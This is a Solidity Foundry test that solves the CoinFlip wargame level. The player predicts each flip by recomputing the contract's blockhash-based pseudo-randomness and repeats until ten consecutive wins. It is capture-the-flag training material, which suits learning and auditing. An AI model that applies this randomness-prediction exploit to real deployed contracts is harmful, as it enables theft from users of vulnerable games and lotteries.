// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/CoinFlip.sol";
import "src/levels/CoinFlipFactory.sol";

contract TestCoinFlip is BaseTest {
    CoinFlip private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.consecutiveWins(), 0);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // You don't have a true random number in solidity, you can only have pseudo random numbers
        // We can guess correct side everytime if we find our guess using the same calculation as the contract
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        do {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            level.flip(side);

            // Mining a block after calling flip fn else the txn will revert
            utilities.mineBlocks(1);
        } while (level.consecutiveWins() < 10);

        assertEq(level.consecutiveWins(), 10);

        vm.stopPrank();
    }
}
